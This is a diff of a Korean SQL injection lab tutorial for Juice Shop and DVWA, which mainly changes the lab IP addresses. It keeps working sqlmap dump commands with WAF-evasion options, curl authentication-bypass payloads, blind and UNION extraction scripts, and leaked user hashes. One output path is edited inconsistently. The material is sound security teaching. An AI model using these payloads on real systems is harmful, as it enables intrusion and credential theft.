@@ -141,18 +141,18 @@ SQL Injection은 **A03:2021 Injection** 카테고리에 속하며, 웹 보안에
 > sudo apt install sqlmap
 >
 > # 1) 가장 단순 — URL 자동 점검
-> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch
+> sqlmap -u "http://10.20.40.81:3000/rest/products/search?q=apple" --batch
 >
 > # 2) JSON POST body — JuiceShop 로그인 점검
-> sqlmap -u http://10.20.30.80:3000/rest/user/login \
+> sqlmap -u http://10.20.40.81:3000/rest/user/login \
 >   --method=POST --data='{"email":"x","password":"x"}' \
 >   --headers='Content-Type: application/json' \
 >   -p email --batch --level=5 --risk=3
 >
 > # 3) 발견된 SQLi 자동 활용 — DB 스키마 dump
-> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch --dbs            # 데이터베이스 목록
-> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch -D Users --tables   # 테이블
-> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch -D Users -T users --dump  # 데이터 dump
+> sqlmap -u "http://10.20.40.81:3000/rest/products/search?q=apple" --batch --dbs            # 데이터베이스 목록
+> sqlmap -u "http://10.20.40.81:3000/rest/products/search?q=apple" --batch -D Users --tables   # 테이블
+> sqlmap -u "http://10.20.40.81:3000/rest/products/search?q=apple" --batch -D Users -T users --dump  # 데이터 dump
 >
 > # 4) WAF 우회 옵션
 > sqlmap -u "..." --batch --tamper=between,space2comment,charunicodeencode --level=5 --risk=3
@@ -173,13 +173,13 @@ SQL Injection은 **A03:2021 Injection** 카테고리에 속하며, 웹 보안에
 ```bash
 # 정상 로그인 시도 (실패)
 echo "=== 정상 (잘못된 비번) ==="
-curl -s -o /dev/null -w "code=%{http_code}\n" -X POST http://10.20.30.80:3000/rest/user/login \
+curl -s -o /dev/null -w "code=%{http_code}\n" -X POST http://10.20.40.81:3000/rest/user/login \
   -H 'Content-Type: application/json' \
   -d '{"email":"admin@juice-sh.op","password":"wrongpassword"}'
 
 # SQLi 공격: ' OR 1=1-- 을 이메일에 삽입
 echo "=== SQLi 인증 우회 ==="
-curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+curl -s -X POST http://10.20.40.81:3000/rest/user/login \
   -H 'Content-Type: application/json' \
   -d $'{"email":"\\' OR 1=1--","password":"anything"}' | python3 -c "
 import sys, json, base64
@@ -216,7 +216,7 @@ token[:60]=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZ...
 ```bash
 # admin 계정으로 SQLi 로그인
 # admin'-- 를 이메일에 넣으면 password 체크를 우회
-curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+curl -s -X POST http://10.20.40.81:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" | python3 -m json.tool 2>/dev/null
 ```
@@ -225,7 +225,7 @@ curl -s -X POST http://10.20.30.80:3000/rest/user/login \
 
 ```bash
 # 작은 따옴표 1개로 문법 오류 유발 → 에러 메시지에서 DB 정보 추출
-curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+curl -s -X POST http://10.20.40.81:3000/rest/user/login \
   -H 'Content-Type: application/json' \
   -d $'{"email":"\\'","password":"x"}' | python3 -m json.tool 2>/dev/null
 ```
@@ -278,7 +278,7 @@ curl -s -X POST http://10.20.30.80:3000/rest/user/login \
 for label_q in "정상=apple" "참=test'))OR+1=1--" "거짓=test'))AND+1=2--"; do
   label="${label_q%%=*}"
   q="${label_q#*=}"
-  count=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$q" \
+  count=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=$q" \
     | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
   echo "$label: 결과 ${count}건"
 done
@@ -303,13 +303,13 @@ done
 
 ```bash
 # SQLite 버전의 첫 글자가 '3'인지 확인
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))AND+SUBSTR(sqlite_version(),1,1)='3'--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null  # silent 모드
+curl -s "http://10.20.40.81:3000/rest/products/search?q=test'))AND+SUBSTR(sqlite_version(),1,1)='3'--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null  # silent 모드
 
 # 자동화: 한 글자씩 추출
 python3 << 'PYEOF'                                     # Python 스크립트 실행
 import requests, string
 
-url = "http://10.20.30.80:3000/rest/products/search"
+url = "http://10.20.40.81:3000/rest/products/search"
 result = ""
 for pos in range(1, 20):                               # 반복문 시작
     found = False
@@ -350,9 +350,9 @@ PYEOF
 ```bash
 # 정상 vs 헤비 페이로드 — TTFB 비교
 echo "=== 정상 ==="
-curl -s -o /dev/null -w "Total: %{time_total}s\n" "http://10.20.30.80:3000/rest/products/search?q=apple"
+curl -s -o /dev/null -w "Total: %{time_total}s\n" "http://10.20.40.81:3000/rest/products/search?q=apple"
 echo "=== Heavy CASE WHEN RANDOMBLOB ==="
-curl -s -o /dev/null -w "Total: %{time_total}s\n" "http://10.20.30.80:3000/rest/products/search?q=test'))AND+(SELECT+CASE+WHEN(1=1)+THEN+RANDOMBLOB(100000000)+ELSE+1+END)--"
+curl -s -o /dev/null -w "Total: %{time_total}s\n" "http://10.20.40.81:3000/rest/products/search?q=test'))AND+(SELECT+CASE+WHEN(1=1)+THEN+RANDOMBLOB(100000000)+ELSE+1+END)--"
 ```
 
 **예상 출력**:
@@ -398,7 +398,7 @@ UNION을 사용하려면 원래 쿼리의 컬럼 수를 알아야 한다.
 ```bash
 # ORDER BY 1..10 — error 발생 직전 = 컬럼 수
 for i in 1 2 3 4 5 6 7 8 9 10; do
-  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))ORDER+BY+$i--")
+  result=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=test'))ORDER+BY+$i--")
   if echo "$result" | grep -qi "error"; then
     echo "ORDER BY $i: ERROR → 컬럼 수 = $((i-1))"
     break
@@ -435,14 +435,14 @@ ORDER BY 10: ERROR → 컬럼 수 = 9
 ```bash
 # SQLite의 sqlite_master에서 테이블 목록 추출
 # 컬럼 수에 맞춰 NULL 패딩
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--" | python3 -m json.tool 2>/dev/null | head -40
+curl -s "http://10.20.40.81:3000/rest/products/search?q=test'))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--" | python3 -m json.tool 2>/dev/null | head -40
 ```
 
 ### 5.4 사용자 테이블 데이터 추출
 
 ```bash
 # UNION SELECT — Users 테이블의 email + password (MD5 해시) 추출
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+email,password,role,4,5,6,7,8,9+FROM+Users--" | python3 -c "
+curl -s "http://10.20.40.81:3000/rest/products/search?q=test'))UNION+SELECT+email,password,role,4,5,6,7,8,9+FROM+Users--" | python3 -c "
 import sys, json
 try:
     data = json.load(sys.stdin).get('data', [])
@@ -490,7 +490,7 @@ ciso@juice-sh.op                 | 6edd9d726cce1f905c1d1614b8b78ade | admin
 
 ```bash
 # 검색 API에 대한 sqlmap 실행 — 발견 결과만 추출
-sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
+sqlmap -u "http://10.20.40.81:3000/rest/products/search?q=test" \
   --batch --level=2 --risk=1 --threads=4 \
   --technique=BEU --timeout=10 2>&1 \
   | grep -E "Type:|Title:|Payload:|back-end DBMS|web application technology|^---" | head -20
@@ -527,10 +527,10 @@ Parameter: q (GET)
 >
 > ```bash
 > # Users 테이블 전체 dump (자동 hash crack 포함)
-> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
+> sqlmap -u "http://10.20.40.81:3000/rest/products/search?q=test" \
 >   --batch --threads=4 --technique=U \
 >   -D SQLite_masterdb -T Users --dump
-> # → /home/$USER/.local/share/sqlmap/output/10.20.30.80/dump/SQLite_masterdb/Users.csv
+> # → /home/$USER/.local/share/sqlmap/output/10.20.32.80/dump/SQLite_masterdb/Users.csv
 > ```
 
 ### 6.2 DB 정보 추출
@@ -539,19 +539,19 @@ SQL Injection 취약점을 자동으로 탐지하고 테스트합니다.
 
 ```bash
 # 데이터베이스 목록
-sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
+sqlmap -u "http://10.20.40.81:3000/rest/products/search?q=test" \
   --batch --dbs --timeout=10
 
 # 테이블 목록
-sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
+sqlmap -u "http://10.20.40.81:3000/rest/products/search?q=test" \
   --batch --tables --timeout=10
 
 # 특정 테이블의 컬럼
-sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
+sqlmap -u "http://10.20.40.81:3000/rest/products/search?q=test" \
   --batch -T Users --columns --timeout=10
 
 # 데이터 덤프 (주의: 실제 환경에서는 반드시 허가 필요)
-sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
+sqlmap -u "http://10.20.40.81:3000/rest/products/search?q=test" \
   --batch -T Users -C email,password --dump --timeout=10
 ```
 
@@ -561,7 +561,7 @@ SQL Injection 취약점을 자동으로 탐지하고 테스트합니다.
 
 ```bash
 # 로그인 API에 대한 sqlmap
-sqlmap -u "http://10.20.30.80:3000/rest/user/login" \
+sqlmap -u "http://10.20.40.81:3000/rest/user/login" \
   --method=POST \
   --data='{"email":"test","password":"test"}' \
   --headers="Content-Type: application/json" \
@@ -648,9 +648,9 @@ cursor.execute("SELECT * FROM users WHERE email=?", (email,))
 
 ### DVWA 보안 레벨 변경 방법 (웹 UI)
 
-> **DVWA URL:** `http://10.20.30.80:8080`
+> **DVWA URL:** `http://10.20.40.82:80`
 
-1. 브라우저에서 `http://10.20.30.80:8080` 접속 → 로그인 (admin / password)
+1. 브라우저에서 `http://10.20.40.82:80` 접속 → 로그인 (admin / password)
 2. 좌측 메뉴 **DVWA Security** 클릭
 3. **Security Level** 드롭다운에서 레벨 선택:
    - **Low**: SQL Injection 필터 없음 → 기본 SQLi 페이로드 테스트
@@ -698,7 +698,7 @@ cursor.execute("SELECT * FROM users WHERE email=?", (email,))
 
 ### Burp Suite Community
 > **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
-> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
+> **실행 위치:** `작업 PC → web (10.20.40.81:3000)`  
 > **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)
 
 **주요 경로·파일**
